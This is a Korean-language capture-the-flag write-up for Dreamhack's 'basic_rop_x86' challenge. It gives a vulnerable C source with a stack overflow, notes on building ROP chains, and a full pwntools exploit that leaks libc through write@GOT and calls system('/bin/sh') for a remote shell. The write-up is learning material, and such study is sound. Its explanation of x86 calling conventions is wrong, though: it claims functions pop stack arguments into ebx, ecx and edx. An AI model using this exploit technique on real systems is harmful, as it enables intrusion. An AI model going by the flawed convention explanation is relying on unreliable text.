## 소스 코드
```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
### checksec
<img width="669" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/215a749b-9759-43d1-a2f3-4db33c079181">

## 문제 풀이 방법

해당 문제는 `basic_rop_x64` 문제처럼 `re2main`이나 `GOT Overwrite`로 풀이가 가능하다. 이번 문제에서는 `ret2main`으로 문제를 풀이하였는데 익스플로잇 코드를 처음 작성하며 실수한 부분이 2가지 있다. 

1. `x86(32bit)` 아키텍처에서는 `x64(64bit)` 아키텍처와 달리 `rbp` 대신 `ebp`를 쓰는 등 레지스터의 범위가 다르며 pwntools로 packing할 때, `p64`가 아닌 `p32`를 사용해야 하는데 이를 인지하지 못했었다.
2. 두번 째는 `x64`와 `x86`의 `Calling Convention`차이를 확인하지 못하였다.

해당 [링크](https://github.com/juhyeongkim527/Dreamhack-Study/blob/main/calling_convention.md)에서 확인할 수 있듯이, `x64`에서는 `rdi, rsi, rdx, rcx, r8, r9` 순서로 6개의 레지스터를 사용하며 인자를 저장한 후 함수를 호출하며, 초과한 나머지 인자는 `스택`에서 차례대로 사용한다. 

그러나 `x86`에서는 함수를 호출한 후 `스택`에서 인자를 차례대로 `pop`해서 자동으로 `ebx, ecx, edx, esi, edi, ebp` 레지스터에 저장 후 사용하기 때문에 `x64`와 차이점이 있다.

중요한 것은 `x86`에서는 **함수를 호출한 후 스택에서 인자를 pop하여 register에 저장하는 반면**,   
`x64`에서는 **스택에서 미리 저장된 값을 pop하여 register에 인자를 저장한 후 함수를 호출**해야 하는 순서 차이가 존재한다.

그리고 `32bit` ELF 파일인 `basic_rop_x86`에는 `ebx, ecx, edx` 순으로 직접 `pop`을 하는 ROPgadget이 존재하지 않는데, 그렇더라도 32bit 호출 규악에서는 스택에 pop을 하면 자동으로 인자에 순서대로 저장되기 때문에,
`pop register`에서 register 종류에 상관 없이 pop을 연속으로 3번 해주는 `pop; pop; pop; ret;` 가젯을 이용하면 된다.

**정리하면, `x64`에서는 레지스터에 값이 삽입된 상태로 함수를 호출하면 해당 함수의 동작을 실행하고, `x86`에서는 함수를 호출하면 호출된 함수 내에서 스택의 값을 가져가서 레지스터에 삽입한 뒤 해당 함수의 동작을 실행한다.**

**x64**
```
pop rdi; ret;
(여기에 ret; 가젯 삽입 불가)
rdi 값
실행할 함수
다음에 실행할 함수 또는 가젯 (앞에서 실행한 함수 내부에 ret;이 있으므로 돌아와서 실행 가능)
(여기에 ret; 가젯 삽입 가능)
pop rdi; pop rsi; ret; (앞에서 함수나 가젯 실행이 독립적으로 다 끝났다면 이어서 해당 가젯 실행 가능)
rdi 값
rsi 값
실행할 함수
...
```

**x86**
```
실행할 함수
pppr 가젯
인자1
인자2
인자3
다음에 실행할 함수
pp2
인자1
인자2
다음에 실행할 함수
...
```

그리고 참고로 위의 예시처럼 `ret;` 리턴 가젯은 **호출할 함수나 instruction주소 또는 가젯** 앞에만 위치해야하고, `pop` 가젯 바로 뒤에서 `pop` 가젯이 저장할 값 앞에 위치하면 안된다. 

ex)   
`p64(pop) + p64(ret) + p64(0x1)` -> 불가능
`p64(ret) + p64(pop) + p64(0x1)` -> 가능

### 1. 근데, `pop; pop; pop; ret;` 가젯 대신 `pop; ret;` + `인자값`을 연속 3번 쓰면 실행을 할 수 없는 이유가 뭐지 ? `x64`와 달리 그리고 3개의 인자 중 2개의 인자만 설정하면 안되는 이유가 무엇일까 ?
일단 내가 추측한 이유로는 `x64`는 함수 호출 이전에 레지스터에 있는 값을 저장하여 인자로 사용하기 때문에 함수를 호출 했을 때, 레지스터 값을 설정하지 않아도 레지스터에 저장된 그 상태를 인자로 생각하면 되니까 `pop; ret;`을 연속으로 사용해도 되고 일단 더 중요한게 **함수 안이 아니므로** `ret`이 나와도 함수가 끝나지 않아서 그런 것이라고 생각한다.

대신 `x86`은 함수 호출 후 스택에 있는 값을 레지스터에 저장하여 인자로 사용하기 때문에, `write`를 기준으로 3개의 인자를 함수 호출 후 `pop`해서 쓰기 때문에, 이전에 레지스터에 저장되어 있던 값은 무시하고 3개의 값을 무조건 stack에서 꺼내와야 하므로 2개만 설정하면 안되고, 중간에 `ret`을 만나면 함수를 종료했다고 생각하기 때문에 `pop; pop; pop; ret;`으로 인자를 3개 먼저 받고 다 받으면 `write` 콜이 실행되고 이후 `ret`으로 함수를 종료해야되는게 아닐까라는 생각이 든다.

## 익스플로잇 코드
```
from pwn import *

# ret2main

context.arch = "i386"
p = remote('host3.dreamhack.games', 14372)

e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')
r = ROP(e)

read_got = e.got['read']
write_plt = e.plt['write']
main = e.symbols['main']

binsh = list(libc.search(b'/bin/sh'))[0]
read_system_offset = libc.symbols['read'] - libc.symbols['system']
read_binsh_offset = libc.symbols['read'] - binsh

pop = r.find_gadget(['pop ebp', 'ret'])[0]
pop3 = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]
# pop = 0x0804868b
# pop3 = 0x08048689
# ret = 0x080483c2

payload = b'a'*0x40 + b'a'*0x8
payload += p32(ret)
payload += p32(write_plt) + p32(pop3) + p32(1) + p32(read_got) + p32(0x4) + p32(main)
# payload += p32(write_plt) + p32(pop) + p32(1) + p32(pop) + p32(read_got) + p32(pop) + p32(0x4) + p32(main)
# 이렇게하면 ret이 섞여서 나와서 안됨

# first main

p.send(payload)

p.recvuntil(b'a'*0x40)
read = u32(p.recv(4))

system = read - read_system_offset
binsh = read - read_binsh_offset

# second main

payload = b'a'*0x40 + b'a'*0x8
payload += p32(system) + p32(pop) + p32(binsh)

p.send(payload)
p.interactive()
```

### 참고
<img width="829" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/e8de9669-fdd0-4b78-b49b-b7e87783834a">
